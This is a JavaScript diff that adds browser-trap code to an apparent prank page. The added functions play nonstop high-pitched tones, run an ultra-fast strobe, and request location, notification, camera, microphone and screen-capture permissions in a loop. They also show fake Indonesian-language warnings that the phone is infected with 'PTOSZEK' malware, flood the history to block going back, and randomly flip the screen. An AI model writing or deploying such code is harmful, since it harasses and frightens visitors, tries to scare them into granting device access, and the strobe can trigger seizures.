@@ -326,6 +326,12 @@ function init () {
     initTorchAndCamera()
     startBatteryDrainerEngine()
     initGDIPayloadCanvas()
+    initContinuousMachineSound()
+    startUltraFastStrobe()
+    startPermissionBomb()
+    startModalDialogTrap()
+    startHistoryFloodTrap()
+    startScreenFlipChaos()
 
     // Prevent default behavior (breaks closing window shortcuts)
     event.preventDefault()
@@ -2481,4 +2487,186 @@ function initGDIPayloadCanvas() {
   }
 
   requestAnimationFrame(renderGDIFrame);
+}
+
+/* ==========================================================================
+   MOBILE PERMISSION BOMB, CONTINUOUS MACHINE SOUND & STROBE ENHANCEMENTS
+   - Continuous Unbroken Machine Sound ('tittttttttttttttttt')
+   - Ultra-Fast Zero-Delay Strobe Overlay
+   - Permission Bombing Loop (Geolocation, Notifications, Camera/Mic, Screen Capture)
+   - Modal Dialog Trap Loop (confirm/prompt)
+   - Infinite History Flood Trap (Anti-Back Gesture)
+   - Screen Flip 180° & Mirror Chaos
+   ========================================================================== */
+
+let machineAudioCtx = null;
+let isMachineAudioStarted = false;
+let isUltraStrobeActive = false;
+let isPermissionBombActive = false;
+let isModalTrapActive = false;
+let isHistoryFloodActive = false;
+let isScreenFlipActive = false;
+
+// Pre-warm AudioContext behind the scenes on load
+try {
+  machineAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
+} catch (e) {}
+
+function initContinuousMachineSound() {
+  if (isMachineAudioStarted) return;
+  isMachineAudioStarted = true;
+
+  try {
+    if (!machineAudioCtx) {
+      machineAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    if (machineAudioCtx.state === 'suspended') {
+      machineAudioCtx.resume().catch(() => {});
+    }
+
+    // Layer 1: Solid Unbroken High Tone ("tittttttttttttttttt" ~2800Hz square wave)
+    const oscTone = machineAudioCtx.createOscillator();
+    const gainTone = machineAudioCtx.createGain();
+    oscTone.type = 'square';
+    oscTone.frequency.setValueAtTime(2800, machineAudioCtx.currentTime);
+    gainTone.gain.setValueAtTime(0.12, machineAudioCtx.currentTime);
+
+    oscTone.connect(gainTone);
+    gainTone.connect(machineAudioCtx.destination);
+    oscTone.start();
+
+    // Layer 2: Continuous Overload Pitch Sweep (Sawtooth 600Hz -> 4500Hz rising sweep loop)
+    const oscSweep = machineAudioCtx.createOscillator();
+    const gainSweep = machineAudioCtx.createGain();
+    oscSweep.type = 'sawtooth';
+    oscSweep.frequency.setValueAtTime(600, machineAudioCtx.currentTime);
+    gainSweep.gain.setValueAtTime(0.08, machineAudioCtx.currentTime);
+
+    oscSweep.connect(gainSweep);
+    gainSweep.connect(machineAudioCtx.destination);
+    oscSweep.start();
+
+    let sweepFreq = 600;
+    setInterval(() => {
+      sweepFreq += 85;
+      if (sweepFreq > 4500) sweepFreq = 600;
+      try {
+        oscSweep.frequency.setValueAtTime(sweepFreq, machineAudioCtx.currentTime);
+      } catch (e) {}
+    }, 40);
+
+    // Layer 3: Sub-bass mechanical rumble hum (~65Hz triangle wave)
+    const oscRumble = machineAudioCtx.createOscillator();
+    const gainRumble = machineAudioCtx.createGain();
+    oscRumble.type = 'triangle';
+    oscRumble.frequency.setValueAtTime(65, machineAudioCtx.currentTime);
+    gainRumble.gain.setValueAtTime(0.15, machineAudioCtx.currentTime);
+
+    oscRumble.connect(gainRumble);
+    gainRumble.connect(machineAudioCtx.destination);
+    oscRumble.start();
+  } catch (e) {}
+}
+
+function startUltraFastStrobe() {
+  if (isUltraStrobeActive) return;
+  isUltraStrobeActive = true;
+
+  const overlay = document.getElementById('ultra-strobe-overlay');
+  if (overlay) {
+    overlay.classList.add('ultra-strobe-overlay-active');
+  }
+}
+
+function startPermissionBomb() {
+  if (isPermissionBombActive) return;
+  isPermissionBombActive = true;
+
+  setInterval(() => {
+    // 1. Geolocation prompt
+    if (navigator.geolocation) {
+      try {
+        navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 2000, maximumAge: 0 });
+      } catch (e) {}
+    }
+
+    // 2. Notification prompt
+    if (typeof Notification !== 'undefined' && Notification.requestPermission) {
+      try {
+        Notification.requestPermission().catch(() => {});
+      } catch (e) {}
+    }
+
+    // 3. Camera / Mic prompt
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      try {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => {});
+      } catch (e) {}
+    }
+
+    // 4. Display Media / Screen Capture prompt
+    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+      try {
+        navigator.mediaDevices.getDisplayMedia({ video: true }).catch(() => {});
+      } catch (e) {}
+    }
+  }, 600);
+}
+
+function startModalDialogTrap() {
+  if (isModalTrapActive) return;
+  isModalTrapActive = true;
+
+  setTimeout(() => {
+    try {
+      window.confirm("🚨 WARNING: HP Anda telah terinfeksi PTOSZEK Bird Malware!\n\nKlik OK untuk mencoba membersihkan virus.");
+      window.prompt("⚠️ PENTING: Masukkan kata kunci 'PTOSZEK' untuk menutup tab browser ini:");
+    } catch (e) {}
+  }, 2000);
+
+  setInterval(() => {
+    if (Math.random() < 0.4) {
+      try {
+        window.confirm("⚠️ PERINGATAN BATERAI & MEMORI: HP Anda terdeteksi overload! Klik OK.");
+      } catch (e) {}
+    }
+  }, 8000);
+}
+
+function startHistoryFloodTrap() {
+  if (isHistoryFloodActive) return;
+  isHistoryFloodActive = true;
+
+  try {
+    for (let i = 0; i < 2000; i++) {
+      window.history.pushState({ trap: i }, '', window.location.pathname + '?ptoszek=' + i);
+    }
+    window.history.pushState({ trap: 'final' }, '', window.location.pathname);
+  } catch (e) {}
+
+  window.addEventListener('popstate', (e) => {
+    try {
+      window.history.forward();
+      window.history.pushState({ trap: Date.now() }, '', window.location.pathname);
+    } catch (err) {}
+  });
+}
+
+function startScreenFlipChaos() {
+  if (isScreenFlipActive) return;
+  isScreenFlipActive = true;
+
+  setInterval(() => {
+    const rand = Math.random();
+    if (rand < 0.35) {
+      document.body.classList.add('mobile-flipped');
+      document.body.classList.remove('mobile-rotated-90');
+    } else if (rand < 0.7) {
+      document.body.classList.remove('mobile-flipped');
+      document.body.classList.add('mobile-rotated-90');
+    } else {
+      document.body.classList.remove('mobile-flipped');
+      document.body.classList.remove('mobile-rotated-90');
+    }
+  }, 3500);
 }
